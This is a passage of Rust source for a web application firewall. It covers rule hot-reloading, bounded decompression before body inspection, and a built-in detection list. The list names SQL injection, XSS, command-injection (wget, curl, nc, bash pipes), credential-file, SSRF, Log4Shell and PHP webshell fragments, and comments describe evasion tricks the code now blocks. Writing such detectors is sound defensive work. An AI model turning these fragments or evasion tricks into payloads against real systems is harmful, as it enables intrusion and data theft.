use std::{
    borrow::Cow,
    collections::{HashMap, HashSet},
    path::PathBuf,
    sync::{Arc, OnceLock},
    time::SystemTime,
};

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, Anchored, Input, MatchKind, StartKind};
use arc_swap::ArcSwap;
// V230 — FxHashMap for compiled-rule per-field buckets. Keys are
// operator-supplied field names like "http.request.uri" — not
// attacker-controlled, so the weaker hash quality vs SipHash is fine
// and the ~4x lower hash cost shows up directly in WAF eval RPS.
use rustc_hash::FxHashMap;
// V230 — memchr::memmem::Finder used in `canon_once`'s evasion
// trigger detection. SIMD prefilter (NEON on aarch64, AVX2 on x86_64)
// is typically 3-10× faster than `str::contains` on payloads
// > 32 bytes, which dominates the body-scan path.
use memchr::memmem::Finder;

use super::{ChallengeLevel, FilterAction, TrafficFilter};
use crate::{
    config::{WafAndGroup, WafConfig, WafRule, WafRuleFile},
    proxy::request_context::RequestContext,
};

pub struct WafFilter {
    enabled: bool,
    /// Custom rules wrapped in ArcSwap so a background mtime-watcher
    /// can hot-reload them without taking a write lock against the
    /// hot path. Reads are lock-free Arc::clone (~5 ns).
    custom_rules: ArcSwap<Vec<WafRule>>,
    /// Source file paths + last seen mtime — driven by the
    /// background hot-reload task.
    rule_files: Vec<PathBuf>,
    /// Most recent observed mtimes per file. ArcSwap so the watcher
    /// task can update without locks. Index matches `rule_files`.
    rule_mtimes: ArcSwap<Vec<Option<SystemTime>>>,
    /// Inline rules from the original config — preserved so
    /// hot-reload can re-merge them with refreshed file contents.
    inline_rules: Vec<WafRule>,
    max_body_bytes: usize,
    max_header_value_bytes: usize,
    max_header_count: usize,
    max_uri_bytes: usize,
    allowed_methods: Option<HashSet<String>>,
    block_smuggling: bool,
    max_decompress_ratio: u32,
    disabled: HashSet<String>,
    /// Aho-Corasick automaton over every built-in signature pattern,
    /// across all categories. Single O(n) scan replaces the previous
    /// ~75 sequential `s.contains(p)` calls per request. Categories
    /// remain individually disablable via `disabled` — the automaton
    /// always scans, but we filter the match by `pat_categories[i]`.
    sig_automaton: AhoCorasick,
    /// Parallel to the patterns in `sig_automaton`: category label of
    /// each pattern (`"sqli"`, `"xss"`, `"cmdi"`, `"path_traversal"`,
    /// `"ssrf"`).
    pat_categories: Vec<&'static str>,
    /// V95 — pre-compiled rule plan. Built once at load/reload time
    /// alongside `custom_rules` so the hot path doesn't repeatedly
    /// parse `r.op`, alloc the canonicalised value once per FIELD
    /// (not per rule), and runs a single AhoCorasick pass per field
    /// for all `contains` patterns instead of N×String::contains.
    /// See [CompiledRules] for the layout.
    compiled: ArcSwap<CompiledRules>,
    /// V109 — total matches (including shadow / log-only) since startup.
    /// Operator exposure: `aegis_waf_shadow_observed` Prometheus counter.
    shadow_observed: std::sync::atomic::AtomicU64,
    /// V237 — per-rule enable/disable overlay for the bundled Sigma
    /// corpus. A rule whose `id` is in the overlay's disabled set is
    /// dropped from the compiled plan (zero hot-path cost). The overlay
    /// file is mtime-polled in `maybe_reload` so a panel toggle on any
    /// worker is picked up cross-worker on the next rule poll.
    sigma_overlay: Arc<crate::filters::sigma_overlay::SigmaOverlay>,
}

/// V109 — operational state of a single WAF rule.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RuleMode {
    /// Default. Hits the rule's `action` (deny / challenge).
    Enforce,
    /// Match increments shadow_observed counter + emits debug log,
    /// but request continues unaffected. Use for new rules during
    /// rollout to measure false-positive rate before enforcement.
    Shadow,
    /// Same as Shadow; separate variant for operator clarity in config.
    Log,
    /// Rule entirely skipped. Cheaper than removing from config while
    /// iterating on a candidate ruleset.
    Disabled,
}

pub fn rule_mode_of(r: &WafRule) -> RuleMode {
    match r
        .mode
        .as_deref()
        .unwrap_or("enforce")
        .to_ascii_lowercase()
        .as_str()
    {
        "shadow" => RuleMode::Shadow,
        "log" => RuleMode::Log,
        "disabled" | "off" => RuleMode::Disabled,
        _ => RuleMode::Enforce,
    }
}

pub fn parse_severity(s: Option<&str>) -> crate::ddos::risk_engine::WafSeverity {
    use crate::ddos::risk_engine::WafSeverity;
    match s.unwrap_or("medium").to_ascii_lowercase().as_str() {
        "critical" => WafSeverity::Critical,
        "high" => WafSeverity::High,
        "low" => WafSeverity::Low,
        _ => WafSeverity::Medium,
    }
}

impl WafFilter {
    /// V194 — derive a [crate::rule_planner::RulePlan] from the
    /// currently-loaded custom_rules so the V181 planner can pre-
    /// filter which rules to evaluate for the current request phase.
    ///
    /// Each WafRule.field maps to a planner field set; severity
    /// maps numerically (critical=5, high=4, medium=3, low=2). The
    /// returned plan is a snapshot — call again after hot-reload
    /// to refresh.
    pub fn rule_descriptors(&self) -> Vec<crate::rule_planner::RuleDescriptor> {
        use crate::rule_planner::RuleDescriptor;
        let custom = self.custom_rules.load();
        let mut out = Vec::with_capacity(custom.len() + self.inline_rules.len());
        let mut next_numeric_id: u32 = 1;
        for r in custom.iter().chain(self.inline_rules.iter()) {
            let severity = match r
                .severity
                .as_deref()
                .map(str::to_ascii_lowercase)
                .as_deref()
            {
                Some("critical") => 5,
                Some("high") => 4,
                Some("medium") => 3,
                Some("low") => 2,
                _ => 3,
            };
            let mut fields = std::collections::BTreeSet::new();
            fields.insert(planner_field_for(&r.field));
            out.push(RuleDescriptor {
                id: next_numeric_id,
                name: r.id.clone(),
                fields,
                severity,
            });
            next_numeric_id += 1;
        }
        out
    }
}

/// Map a WafRule.field string ("path", "query", "header.cookie",
/// "body") into the planner's `http.request.*` namespace so phase
/// inference works as documented in `rule_planner`.
fn planner_field_for(field: &str) -> String {
    let f = field.to_ascii_lowercase();
    if f == "path" || f.starts_with("uri") {
        "http.request.uri.path".to_string()
    } else if f == "query" || f.starts_with("query") {
        "http.request.query".to_string()
    } else if let Some(name) = f.strip_prefix("header.") {
        format!("http.request.headers.{name}")
    } else if f == "header" || f == "headers" {
        "http.request.headers".to_string()
    } else if f == "body" || f.starts_with("body") {
        "http.request.body.raw".to_string()
    } else if f == "method" {
        "http.request.method".to_string()
    } else {
        // Unknown / custom fields default to the headers bucket so
        // the planner doesn't silently drop them.
        "http.request.headers".to_string()
    }
}

impl WafFilter {
    pub fn new(cfg: &WafConfig) -> Self {
        let rule_files: Vec<PathBuf> = cfg.rule_files.iter().map(PathBuf::from).collect();
        let (custom_rules, mtimes) = Self::load_rules_from(&cfg.custom_rules, &rule_files);
        let disabled: HashSet<String> = cfg
            .disable_signatures
            .iter()
            .map(|s| s.to_ascii_lowercase())
            .collect();
        let allowed_methods = if cfg.allowed_methods.is_empty() {
            None
        } else {
            Some(
                cfg.allowed_methods
                    .iter()
                    .map(|m| m.to_ascii_uppercase())
                    .collect(),
            )
        };
        let (sig_automaton, pat_categories) = build_signature_automaton();
        // V237 — load the Sigma per-rule overlay (deny-list of disabled
        // rule IDs) and apply it to the initial compile.
        let sigma_overlay = Arc::new(crate::filters::sigma_overlay::SigmaOverlay::open_default());
        let compiled =
            CompiledRules::build_with_overlay(&custom_rules, &sigma_overlay.disabled_ids());
        Self {
            enabled: cfg.enabled,
            custom_rules: ArcSwap::from_pointee(custom_rules),
            compiled: ArcSwap::from_pointee(compiled),
            sigma_overlay,
            rule_files,
            rule_mtimes: ArcSwap::from_pointee(mtimes),
            inline_rules: cfg.custom_rules.clone(),
            max_body_bytes: cfg.max_body_bytes.unwrap_or(64 * 1024),
            max_header_value_bytes: cfg.max_header_value_bytes.max(64),
            max_header_count: cfg.max_header_count.max(8),
            max_uri_bytes: cfg.max_uri_bytes.max(64),
            allowed_methods,
            block_smuggling: cfg.block_smuggling,
            max_decompress_ratio: cfg.max_decompress_ratio,
            disabled,
            sig_automaton,
            pat_categories,
            shadow_observed: std::sync::atomic::AtomicU64::new(0),
        }
    }

    /// V231 — config-time enable state, the value parsed from
    /// `WafConfig::enabled`. `FilterEngine::new` reads this to seed the
    /// engine's `RuntimeToggles` entry for this filter so the engine is
    /// the single source of truth for enable/disable (incl. per-domain
    /// `domain_policy` overrides). `check()` no longer self-gates on it.
    pub fn config_enabled(&self) -> bool {
        self.enabled
    }

    /// V237 — shared handle to the Sigma per-rule overlay. The admin
    /// API uses it to read the disabled set (for the "list" endpoint)
    /// and to toggle individual rules. Same `Arc` the compile path
    /// reads, so a toggle is visible to the next `recompile_now()`.
    pub fn sigma_overlay(&self) -> &Arc<crate::filters::sigma_overlay::SigmaOverlay> {
        &self.sigma_overlay
    }

    /// V237 — force an immediate rebuild of the compiled rule plan from
    /// the currently-loaded rules + the current overlay disabled-set.
    /// Called right after an admin toggle so the change takes effect on
    /// THIS worker without waiting for the background mtime poll (other
    /// workers pick it up via the overlay file's mtime). Cheap relative
    /// to a request burst; the toggle is a rare operator action.
    pub fn recompile_now(&self) {
        let rules = self.custom_rules.load_full();
        let new_compiled =
            CompiledRules::build_with_overlay(&rules, &self.sigma_overlay.disabled_ids());
        self.compiled.store(Arc::new(new_compiled));
    }

    /// Load rules from in-config inline list + on-disk files. Returns
    /// the merged rule set and the per-file mtimes (used by the
    /// hot-reload watcher to detect changes).
    fn load_rules_from(
        inline: &[WafRule],
        files: &[PathBuf],
    ) -> (Vec<WafRule>, Vec<Option<SystemTime>>) {
        let mut rules = inline.to_vec();
        let mut mtimes = Vec::with_capacity(files.len());
        for path in files {
            let mtime = std::fs::metadata(path).ok().and_then(|m| m.modified().ok());
            mtimes.push(mtime);
            match std::fs::read_to_string(path) {
                Ok(raw) => match toml::from_str::<WafRuleFile>(&raw) {
                    Ok(file) => {
                        tracing::info!(
                            path = %path.display(),
                            count = file.rules.len(),
                            "loaded WAF rule file"
                        );
                        rules.extend(file.rules);
                    }
                    Err(e) => {
                        tracing::warn!(path = %path.display(), error = %e, "WAF rule file parse error")
                    }
                },
                Err(e) => {
                    tracing::warn!(path = %path.display(), error = %e, "WAF rule file read error")
                }
            }
        }
        (rules, mtimes)
    }

    /// V19.3 — Hot-reload WAF rule files if any have changed on disk.
    /// Called periodically by a background watcher. Returns the
    /// number of files that were reloaded (0 = unchanged); on any
    /// change the entire rule set is rebuilt and atomically swapped
    /// in via ArcSwap — readers on the hot path see the old or new
    /// set, never a torn intermediate state.
    pub fn maybe_reload_rules(&self) -> usize {
        self.maybe_reload(&self.inline_rules)
    }

    fn maybe_reload(&self, inline: &[WafRule]) -> usize {
        let prev_mtimes = self.rule_mtimes.load_full();
        let mut changed = 0usize;
        let mut new_mtimes = Vec::with_capacity(self.rule_files.len());
        for (i, path) in self.rule_files.iter().enumerate() {
            let now = std::fs::metadata(path).ok().and_then(|m| m.modified().ok());
            let prev = prev_mtimes.get(i).copied().flatten();
            if now != prev {
                changed += 1;
            }
            new_mtimes.push(now);
        }
        // V237 — also pick up Sigma per-rule overlay edits (a panel
        // toggle on this or any other worker). `refresh()` is a cheap
        // mtime stat; it only re-reads the file when it actually
        // changed and reports whether the disabled set was replaced.
        let overlay_changed = self.sigma_overlay.refresh();
        if changed == 0 && !overlay_changed {
            return 0;
        }
        let (rules, _) = Self::load_rules_from(inline, &self.rule_files);
        // V95 — recompile the rule plan BEFORE swapping in the new
        // rules vec; ArcSwap of compiled lets readers see the matching
        // version even if they grab `compiled` between the two stores.
        // V237 — apply the current overlay disabled-set to the compile.
        let new_compiled =
            CompiledRules::build_with_overlay(&rules, &self.sigma_overlay.disabled_ids());
        self.compiled.store(Arc::new(new_compiled));
        self.custom_rules.store(Arc::new(rules));
        self.rule_mtimes.store(Arc::new(new_mtimes));
        tracing::info!(changed, overlay_changed, "WAF rule files reloaded");
        changed
    }

    /// Diagnostic: count of currently-loaded custom rules. Cheap.
    pub fn rule_count(&self) -> usize {
        self.custom_rules.load().len()
    }

    fn match_signature(&self, data: &str) -> Option<&'static str> {
        let s = canon(data);
        self.match_signature_canon(s.as_ref())
    }

    /// V245 — public wrapper around the built-in signature matcher, used by
    /// the nginx-comparison benchmark to show which attack payloads AEGIS's
    /// WAF blocks (that a vanilla nginx would pass straight through). Returns
    /// the matched category (e.g. "sqli", "webshell") or None.
    pub fn signature_category(&self, data: &str) -> Option<&'static str> {
        self.match_signature(data)
    }

    /// V230 — variant of [`Self::match_signature`] that takes an
    /// already-canonicalised string and skips the per-call `canon()`.
    ///
    /// Used by the hot path in [`Self::check`] together with the
    /// request-scoped [`CanonCtx`] so each field's `canon()` runs at
    /// most once per request — the previous flow paid one `canon()`
    /// here AND another in `val_with_canon` for the same field.
    fn match_signature_canon(&self, s: &str) -> Option<&'static str> {
        // Fast path: single O(n) scan returning the first leftmost
        // match. `find()` doesn't allocate iterator state, which
        // matters on the hot GET path where most requests don't match
        // anything and we just want a yes/no answer.
        let first = self.sig_automaton.find(s)?;
        let cat = self.pat_categories[first.pattern().as_usize()];
        if !self.disabled.contains(cat) {
            return Some(cat);
        }
        // Slow path: the leftmost match's category was disabled in
        // config. Fall back to iterating subsequent matches so a
        // disabled category doesn't mask a real signature behind it.
        for m in self.sig_automaton.find_iter(s) {
            let cat = self.pat_categories[m.pattern().as_usize()];
            if !self.disabled.contains(cat) {
                return Some(cat);
            }
        }
        None
    }

    /// V95 → V109 — translate a compiled-rule hit (rule index) into
    /// the FilterAction the check_custom_rules path expects. V109 adds
    /// the rule-mode gate: "shadow" / "log" returns Allow (so the
    /// match is metric-counted but doesn't affect the request);
    /// "disabled" was already filtered at compile time; "enforce"
    /// (default) reads `r.action` as before.
    fn rule_action(&self, rules: &[WafRule], rule_idx: usize) -> FilterAction {
        let r = &rules[rule_idx];
        let mode = rule_mode_of(r);
        // Increment per-rule + per-mode counter regardless of mode so
        // operators see shadow matches in metrics.
        self.shadow_observed
            .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        if matches!(mode, RuleMode::Shadow | RuleMode::Log) {
            // The compiled plan's eval already memoised the value lookup;
            // we just emit a tracing line so operators piping through
            // log aggregators can see shadow matches.
            tracing::debug!(
                target: "aegis::waf::shadow",
                rule_id = %r.id,
                severity = %r.severity.as_deref().unwrap_or("medium"),
                "WAF rule matched in shadow mode"
            );
            return FilterAction::Allow;
        }
        let safe_reason = format!(
            "waf rule {} {}",
            r.id.replace(['\r', '\n'], "_"),
            match r.action.as_str() {
                "challenge" => "challenge",
                _ => "deny",
            }
        );
        match r.action.as_str() {
            "challenge" => FilterAction::Challenge {
                level: ChallengeLevel::Captcha,
                reason: safe_reason.into(),
            },
            _ => FilterAction::Deny {
                status: 403,
                reason: safe_reason.into(),
            },
        }
    }

    /// V109 — Aggregated shadow-match counter exposed to admin via
    /// /metrics so operators can quantify how often their proposed
    /// rules WOULD have fired without the risk of blocking traffic.
    pub fn shadow_observed(&self) -> u64 {
        self.shadow_observed
            .load(std::sync::atomic::Ordering::Relaxed)
    }

    /// V109 — derive a [crate::ddos::risk_engine::WafSignal] from the
    /// most recent compiled-rule hit (rule index). Used by request_filter
    /// when feeding the risk engine: WAF severity becomes a graded
    /// contribution rather than a binary deny.
    pub fn rule_signal(
        &self,
        rules: &[WafRule],
        rule_idx: usize,
    ) -> crate::ddos::risk_engine::WafSignal {
        let r = &rules[rule_idx];
        crate::ddos::risk_engine::WafSignal {
            severity: parse_severity(r.severity.as_deref()),
            // SAFETY: rule ids are operator-supplied strings; we don't
            // have a 'static lifetime guarantee. Use a known-fixed
            // placeholder for the SignalTarget; operators see the real
            // id via the metrics label set fed from `r.id` elsewhere.
            rule_id: "custom",
        }
    }

    pub fn max_body_bytes(&self) -> usize {
        self.max_body_bytes
    }

    pub fn max_decompress_ratio(&self) -> u32 {
        self.max_decompress_ratio
    }

    /// Inspect the actual request body bytes. Called after the body is
    /// fully collected, so it catches chunked uploads where the client
    /// lied about (or omitted) `content-length`. Returns Deny on:
    ///   - body length over `max_body_bytes`
    ///   - any signature match anywhere in the accepted body
    ///
    /// V233 — the scan now covers the entire accepted body (bounded by
    /// `max_body_bytes`) rather than a fixed 256 KiB prefix, and uses
    /// lossy UTF-8 decoding so non-UTF-8 / binary bodies are still
    /// scanned instead of being silently skipped.
    pub fn inspect_body(&self, body: &[u8]) -> Option<FilterAction> {
        // SECURITY (C4) — the no-encoding entry point. Callers that have
        // the request's `Content-Encoding` header MUST route through
        // [`Self::inspect_body_with_encoding`] instead so compressed
        // bodies are decompressed before inspection; this wrapper exists
        // for the (rare) call sites with no header access and treats the
        // body as identity-encoded.
        self.inspect_body_with_encoding(body, None)
    }

    /// SECURITY (C4) — inspect the request body, decompressing first when
    /// the request carries a `Content-Encoding`.
    ///
    /// Without this, a client could `Content-Encoding: gzip` a body, ship
    /// it past [`Self::inspect_body`] (which scanned the still-compressed
    /// bytes — opaque to the signature automaton), and have the upstream
    /// transparently decompress it into a live SQLi / XSS / cmd-injection
    /// payload. The WAF therefore has to see the SAME bytes the upstream
    /// will: we decompress here, bounded so a decompression bomb can't be
    /// turned into a memory-exhaustion DoS, then run the existing scan on
    /// the decompressed bytes.
    ///
    /// Encoding policy:
    ///   - absent / `identity` → scan as-is (the historical behaviour).
    ///   - `gzip` / `x-gzip` / `deflate` → decompress, bounded, then scan.
    ///   - anything else (`br`, `compress`, `zstd`, multiple stacked
    ///     encodings, …) → **FAIL CLOSED**: we cannot see what the
    ///     upstream will see, so we deny rather than forward an
    ///     uninspectable body.
    ///
    /// `content_encoding` is the raw header value (may contain a list).
    pub fn inspect_body_with_encoding(
        &self,
        body: &[u8],
        content_encoding: Option<&str>,
    ) -> Option<FilterAction> {
        if !self.enabled {
            return None;
        }
        if body.len() > self.max_body_bytes {
            return Some(FilterAction::Deny {
                status: 413,
                reason: "waf body too large".into(),
            });
        }

        // SECURITY (C4) — resolve the content-encoding into a single
        // supported codec, or fail closed. We normalise case + trim, and
        // treat an empty / `identity` token as "no encoding". A list with
        // more than one *effective* (non-identity) encoding is rejected:
        // chained encodings (`gzip, gzip`) are a classic WAF-evasion /
        // smuggling vector and the upstream's behaviour is ambiguous.
        let codec = match content_encoding {
            None => BodyCodec::Identity,
            Some(raw) => {
                let mut effective: Option<BodyCodec> = None;
                for tok in raw.split(',') {
                    let tok = tok.trim();
                    if tok.is_empty() {
                        continue;
                    }
                    let this = match tok.to_ascii_lowercase().as_str() {
                        "identity" => continue,
                        "gzip" | "x-gzip" => BodyCodec::Gzip,
                        "deflate" => BodyCodec::Deflate,
                        // br / compress / zstd / unknown → uninspectable.
                        _ => {
                            return Some(FilterAction::Deny {
                                status: 415,
                                reason: format!(
                                    "waf: unsupported content-encoding `{}` (cannot inspect body)",
                                    tok.replace(['\r', '\n'], "_")
                                )
                                .into(),
                            });
                        }
                    };
                    if effective.is_some() {
                        // Two or more stacked non-identity encodings.
                        return Some(FilterAction::Deny {
                            status: 415,
                            reason: "waf: multiple content-encodings (cannot inspect body)".into(),
                        });
                    }
                    effective = Some(this);
                }
                effective.unwrap_or(BodyCodec::Identity)
            }
        };

        // Decompress when needed. The output is bounded by BOTH the
        // operator's `max_body_bytes` ceiling AND `max_decompress_ratio`
        // (output ≤ ratio × input) so neither a giant nor a high-ratio
        // bomb can exhaust memory. On a bound breach or any decode error
        // we FAIL CLOSED — an undecodable "gzip" body is at best
        // malformed and at worst a deliberate evasion attempt.
        let decoded: Cow<'_, [u8]> = match codec {
            BodyCodec::Identity => Cow::Borrowed(body),
            BodyCodec::Gzip | BodyCodec::Deflate => match self.decompress_bounded(codec, body) {
                Ok(bytes) => Cow::Owned(bytes),
                Err(reason) => {
                    return Some(FilterAction::Deny {
                        status: 400,
                        reason: format!("waf: {reason}").into(),
                    });
                }
            },
        };

        // V233 — BUG 2 (auth_bypass): the previous code capped the
        // scan at 256 KiB while `max_body_bytes` (operator-set, up to
        // 16 MiB) governed the size-reject. Bytes between 256 KiB and
        // `max_body_bytes` were forwarded to upstream UNSCANNED, so a
        // signature placed past offset 256 KiB bypassed the WAF
        // entirely. We now scan the WHOLE accepted body — the body has
        // already passed the `max_body_bytes` ceiling above, so this
        // is bounded by the operator's own configured limit.
        let scan_window = decoded.len();
        // V233 — BUG 3 (auth_bypass): the previous code used
        // `std::str::from_utf8`, which returns `Err` (and silently
        // skipped the ENTIRE body scan) whenever the body was not
        // valid UTF-8 — including a body that is valid UTF-8 but
        // whose accepted slice happened to end mid-codepoint, or any
        // body carrying raw binary bytes. `from_utf8_lossy` instead
        // substitutes U+FFFD for invalid sequences and always yields
        // a scannable string, so a non-UTF-8 (or partially-UTF-8)
        // body can no longer smuggle a signature past inspection.
        let snippet = String::from_utf8_lossy(&decoded[..scan_window]);
        if let Some(kind) = self.match_signature(&snippet) {
            return Some(FilterAction::Deny {
                status: 403,
                reason: format!("waf signature in body: {kind}").into(),
            });
        }
        None
    }

    /// SECURITY (C4) — decompress `body` with `codec`, bounded by both
    /// `max_body_bytes` and `max_decompress_ratio` so a decompression
    /// bomb cannot be turned into a memory-exhaustion DoS. Returns the
    /// decompressed bytes on success, or a short reason string to deny on.
    fn decompress_bounded(&self, codec: BodyCodec, body: &[u8]) -> Result<Vec<u8>, &'static str> {
        use std::io::Read;
        // Output ceiling: the smaller-bounded of the operator's body
        // ceiling and `ratio × input`. `max_decompress_ratio == 0` would
        // pin the cap at the input length only via the ratio term, so we
        // floor the ratio at 1 to always allow at least 1:1 expansion.
        // We read up to `cap + 1` bytes so we can distinguish "exactly at
        // cap" from "overran the cap".
        let ratio = self.max_decompress_ratio.max(1) as u64;
        let ratio_cap = (body.len() as u64).saturating_mul(ratio);
        let cap = ratio_cap.min(self.max_body_bytes as u64);
        // A take limit of `cap + 1` lets us detect overrun deterministically.
        let read_limit = cap.saturating_add(1);

        let mut out = Vec::new();
        let result = match codec {
            BodyCodec::Gzip => {
                let mut dec = flate2::read::GzDecoder::new(body).take(read_limit);
                dec.read_to_end(&mut out)
            }
            BodyCodec::Deflate => {
                // Accept both zlib-wrapped and raw DEFLATE: ZlibDecoder
                // handles the (RFC 1950) zlib container that HTTP
                // `deflate` is *supposed* to use; many clients send raw
                // DEFLATE instead, so fall back to that on failure.
                let mut dec = flate2::read::ZlibDecoder::new(body).take(read_limit);
                match dec.read_to_end(&mut out) {
                    Ok(n) => Ok(n),
                    Err(_) => {
                        out.clear();
                        let mut raw = flate2::read::DeflateDecoder::new(body).take(read_limit);
                        raw.read_to_end(&mut out)
                    }
                }
            }
            BodyCodec::Identity => return Ok(body.to_vec()),
        };
        match result {
            Ok(_) => {
                if out.len() as u64 > cap {
                    // Exceeded the bound (we read cap+1). Treat as a bomb.
                    Err("decompressed body exceeds size/ratio limit")
                } else {
                    Ok(out)
                }
            }
            Err(_) => Err("malformed compressed body"),
        }
    }
}

/// SECURITY (C4) — supported request-body content codecs. Anything not
/// representable here is uninspectable and denied (fail closed).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum BodyCodec {
    Identity,
    Gzip,
    Deflate,
}

/// Built-in signature corpus. Each pair is `(pattern, category)`.
/// Categories must match the strings used in the WAF `disable_signatures`
/// config. Patterns are matched on the **canonicalised** (lowercased,
/// URL-decoded, evasion-stripped) request — see `canon()` — so they
/// only need to capture their lowercase form.
///
/// Order matters only for human inspection; Aho-Corasick treats all
/// patterns symmetrically and `find_iter` returns matches in input
/// order, not pattern-list order.
const BUILTIN_SIGNATURES: &[(&str, &str)] = &[
    // -- webshell (PHP "dumb shell" execution patterns) --
    // Listed FIRST so that, under `LeftmostFirst` match semantics, these
    // specific literals win over the broader `eval(` (xss) when both start
    // at the same offset — e.g. `eval($_post[...]` / `eval(base64_decode(...`
    // are correctly labelled `webshell`, while a bare `eval(foo)` still
    // falls through to xss.
    //
    // These match the canonicalised (lowercased, URL-decoded) request
    // INCLUDING the POST body (the WAF scans bodies via
    // `inspect_body_with_encoding`). We deliberately match the
    // *sink + PHP-superglobal concatenation* (e.g. `eval($_post`) rather
    // than the bare sink, because the concatenated literal is inherently
    // specific — it does not occur in legitimate request data, JSON, or
    // HTML — so this is a near-zero-false-positive signal even when
    // enforcing. Covers the canonical c99/r57/wso/b374k/weevely family and
    // the eval(base64_decode(...)) / eval(gzinflate(...)) packer chains.
    ("eval($_post", "webshell"),
    ("eval($_get", "webshell"),
    ("eval($_request", "webshell"),
    ("eval($_cookie", "webshell"),
    ("eval($_server", "webshell"),
    ("eval($_files", "webshell"),
    ("assert($_post", "webshell"),
    ("assert($_get", "webshell"),
    ("assert($_request", "webshell"),
    ("assert($_cookie", "webshell"),
    ("system($_get", "webshell"),
    ("system($_post", "webshell"),
    ("system($_request", "webshell"),
    ("exec($_get", "webshell"),
    ("exec($_post", "webshell"),
    ("exec($_request", "webshell"),
    ("passthru($_", "webshell"),
    ("shell_exec($_", "webshell"),
    ("proc_open($_", "webshell"),
    ("popen($_", "webshell"),
    ("base64_decode($_", "webshell"),
    ("call_user_func($_", "webshell"),
    ("call_user_func_array($_", "webshell"),
    ("create_function(", "webshell"),
    // Packer / obfuscation chains — `eval(`/`assert(` immediately wrapping
    // a decoder is the universal webshell unpacking idiom.
    ("eval(base64_decode", "webshell"),
    ("eval(gzinflate", "webshell"),
    ("eval(gzuncompress", "webshell"),
    ("eval(gzdecode", "webshell"),
    ("eval(str_rot13", "webshell"),
    ("assert(base64_decode", "webshell"),
    ("eval(stripslashes($_", "webshell"),
    ("eval(\\x", "webshell"),
    // `preg_replace` with the /e (PHP < 7) code-execution modifier.
    ("preg_replace(\"/.*/e\"", "webshell"),
    ("preg_replace('/.*/e'", "webshell"),
    // Distinctive dropped-shell filenames in the URI. The generic
    // `shell.php`/`cmd.php` are intentionally omitted (legit apps exist);
    // these literals belong to specific public webshell families.
    ("/c99.php", "webshell"),
    ("/r57.php", "webshell"),
    ("/c100.php", "webshell"),
    ("/wso.php", "webshell"),
    ("/b374k", "webshell"),
    ("/weevely", "webshell"),
    ("/alfa.php", "webshell"),
    ("/alfashell", "webshell"),
    ("/indoxploit", "webshell"),
    ("/0byt3m1n1", "webshell"),
    ("/mini-shell", "webshell"),
    ("/p0wny", "webshell"),
    // -- sqli --
    ("union select", "sqli"),
    ("union all select", "sqli"),
    (" or 1=1", "sqli"),
    ("' or '1'='1", "sqli"),
    ("'or'1'='1", "sqli"),
    ("sleep(", "sqli"),
    ("pg_sleep(", "sqli"),
    ("waitfor delay", "sqli"),
    ("benchmark(", "sqli"),
    ("drop table", "sqli"),
    ("drop database", "sqli"),
    ("load_file(", "sqli"),
    ("into outfile", "sqli"),
    ("information_schema", "sqli"),
    ("/*!", "sqli"),
    (";--", "sqli"),
    ("convert(int", "sqli"),
    ("extractvalue(", "sqli"),
    ("updatexml(", "sqli"),
    // -- xss --
    ("<script", "xss"),
    ("</script", "xss"),
    ("javascript:", "xss"),
    ("data:text/html", "xss"),
    ("vbscript:", "xss"),
    ("onerror=", "xss"),
    ("onload=", "xss"),
    ("onfocus=", "xss"),
    ("onmouseover=", "xss"),
    ("onclick=", "xss"),
    ("<iframe", "xss"),
    ("<svg/onload", "xss"),
    ("srcdoc=", "xss"),
    ("eval(", "xss"),
    ("settimeout(", "xss"),
    // -- cmdi --
    (";cat ", "cmdi"),
    (";wget ", "cmdi"),
    (";curl ", "cmdi"),
    (";nc ", "cmdi"),
    ("|bash", "cmdi"),
    ("|sh", "cmdi"),
    ("|/bin/", "cmdi"),
    ("&& rm -rf", "cmdi"),
    ("/bin/sh", "cmdi"),
    ("/bin/bash", "cmdi"),
    ("$(curl", "cmdi"),
    ("$(wget", "cmdi"),
    ("`curl", "cmdi"),
    ("`wget", "cmdi"),
    ("%0acat ", "cmdi"),
    (";python -c", "cmdi"),
    (";perl -e", "cmdi"),
    // -- path_traversal --
    ("../../", "path_traversal"),
    ("..\\..\\", "path_traversal"),
    ("/etc/passwd", "path_traversal"),
    ("/etc/shadow", "path_traversal"),
    ("/proc/self/", "path_traversal"),
    ("c:\\windows\\", "path_traversal"),
    ("..%2f", "path_traversal"),
    ("..%5c", "path_traversal"),
    // -- ssrf --
    ("http://169.254.169.254", "ssrf"),
    ("http://metadata.google", "ssrf"),
    ("http://localhost:", "ssrf"),
    ("http://127.0.0.1", "ssrf"),
    ("http://0.0.0.0", "ssrf"),
    ("file://", "ssrf"),
    ("gopher://", "ssrf"),
    ("dict://", "ssrf"),
    // SSRF schemes confirmed bypassing live alongside the JNDI/LFI
    // wrappers below. `ldap://` and `jar:` are narrow enough not to
    // collide with legitimate traffic (no legit HTTP request body /
    // URI carries an LDAP or JAR URL scheme).
    ("ldap://", "ssrf"),
    ("jar:", "ssrf"),
    // -- rce (Log4Shell / JNDI) --
    // CVE-2021-44228 et al. After canonicalisation the payload is
    // lowercased, so the literals here are the post-canon form. The
    // `${jndi:` prefix catches the generic lookup; the explicit
    // scheme literals (`jndi:ldap`, …) catch variants where the
    // `${` was stripped/obfuscated upstream but the scheme survives.
    // None of these appear in legitimate request data.
    ("${jndi:", "rce"),
    ("jndi:ldap", "rce"),
    ("jndi:rmi", "rce"),
    ("jndi:dns", "rce"),
    ("jndi:nis", "rce"),
    ("jndi:iiop", "rce"),
    // -- lfi (PHP stream / LFI wrappers) --
    // `php://`, `phar://`, `expect://`, `zip://`, `data://text/`,
    // and the explicit `php://filter` (RCE-via-filter-chain). These
    // are PHP URL-wrapper schemes that have no place in normal
    // request input, so matching the scheme is low-false-positive.
    // `data://text/` is qualified (not a bare `data://`) to avoid
    // colliding with the XSS `data:text/html` family already above.
    ("php://", "lfi"),
    ("php://filter", "lfi"),
    ("phar://", "lfi"),
    ("expect://", "lfi"),
    ("zip://", "lfi"),
    ("data://text/", "lfi"),
    // -- xxe --
    // Inbound XML carrying an inline DTD / entity declaration is the
    // XXE / billion-laughs vector. The `<!doctype` / `<!entity`
    // literals (lowercased by canon) only appear in XML documents
    // declaring a DTD, which a JSON/HTML API request body never does.
    ("<!doctype", "xxe"),
    ("<!entity", "xxe"),
];

/// Build a `LeftmostFirst` Aho-Corasick automaton over every signature
/// pattern. `LeftmostFirst` matches what the legacy linear loop did:
